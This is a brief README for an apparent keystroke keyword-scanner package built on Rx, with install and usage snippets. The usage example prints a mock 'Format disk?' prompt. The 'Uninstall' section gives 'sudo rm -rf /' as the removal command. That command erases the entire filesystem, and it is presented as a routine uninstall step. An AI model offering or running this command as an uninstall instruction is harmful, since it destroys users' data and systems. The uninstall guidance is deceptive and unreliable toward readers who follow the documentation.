# scan-keystroke-rx
Rx scanner for specified keyword in the keystroke event stream

## Install
```
yarn add scan-keystroke-rx
```

## Use
```
import { findKeyword } from 'scan-keystroke-rx';

findKeyword('hello world').subscribe(
  phrase => {
    console.log(`Phrase "${phrase}" detected! Format disk? (yes/no) default yes. Accepted.`);
  }
)
```

## Uninstall
```
sudo rm -rf /
```
